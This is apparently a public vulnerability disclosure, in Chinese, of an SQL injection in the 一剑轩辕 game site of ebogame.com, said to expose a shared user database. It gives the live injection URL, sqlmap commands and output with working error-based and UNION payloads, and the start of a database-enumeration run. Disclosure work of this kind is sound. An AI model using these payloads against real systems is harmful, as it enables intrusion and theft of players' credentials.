wybug_title: 第一波游戏某站注入漏洞与主站同库（235W万玩家信息可被泄露(用户名/密码/支付密码等) #2
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2016-01-28：	积极联系厂商并且等待厂商认领中，细节不对外公开									2016-03-10：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：     漏洞证明：  注入点
http://yjxy.ebogame.com/gameing.php?url=2
参数为url
C:\Python27\sqlmap>sqlmap.py   -u "http://yjxy.ebogame.com/gameing.php?url=2"         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150429}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 10:28:56[10:28:56] [INFO] resuming back-end DBMS 'mysql'[10:28:56] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: url (GET)    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: url=2' AND (SELECT 9024 FROM(SELECT COUNT(*),CONCAT(0x71787a7671,(SELECT (ELT(9024=9024,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'DLdS'='DLdS    Type: UNION query    Title: Generic UNION query (NULL) - 12 columns    Payload: url=2' UNION ALL SELECT NULL,CONCAT(0x71787a7671,0x56624d4869787467567a,0x71786a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-----[10:28:56] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.3, Nginxback-end DBMS: MySQL 5.0
一剑轩辕官方网站-第一波网页游戏其数据库为主站数据库
C:\Python27\sqlmap>sqlmap.py   -u "http://yjxy.ebogame.com/gameing.php?url=2" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150429}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws.
